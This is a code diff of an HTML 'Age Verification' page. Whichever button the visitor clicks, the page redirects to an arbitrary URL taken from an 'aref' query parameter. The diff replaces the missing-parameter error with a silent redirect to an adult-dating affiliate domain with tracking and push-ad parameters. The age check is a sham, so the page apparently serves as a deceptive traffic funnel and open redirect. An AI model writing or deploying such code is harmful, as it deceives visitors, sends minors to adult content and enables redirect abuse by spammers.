@@ -111,20 +111,21 @@
     <h1>Age Verification</h1>
     <p>Are you 18 or older?</p>
     <div class="buttons">
-      <button class="btn btn-no" onclick="redirectToAref()">No</button>
-      <button class="btn btn-yes" onclick="redirectToAref()">Yes</button>
+      <button class="btn btn-no" onclick="redirectToTarget()">No</button>
+      <button class="btn btn-yes" onclick="redirectToTarget()">Yes</button>
     </div>
   </div>
 
   <script>
-    function redirectToAref() {
+    function redirectToTarget() {
       const currentUrl = window.location.href;
       const arefIndex = currentUrl.indexOf('aref=');
       if (arefIndex !== -1) {
         const arefUrl = decodeURIComponent(currentUrl.substring(arefIndex + 5));
         window.location.href = arefUrl;
       } else {
-        alert('Redirect URL not found (missing "aref" parameter in the URL).');
+        // Запасной адрес
+        window.location.href = "https://jndbdj.lonelylady.net/?utm_source=da57dc555e50572d&ban=push&j1=1&s1=233166&s2=2115496";
       }
     }
   </script>
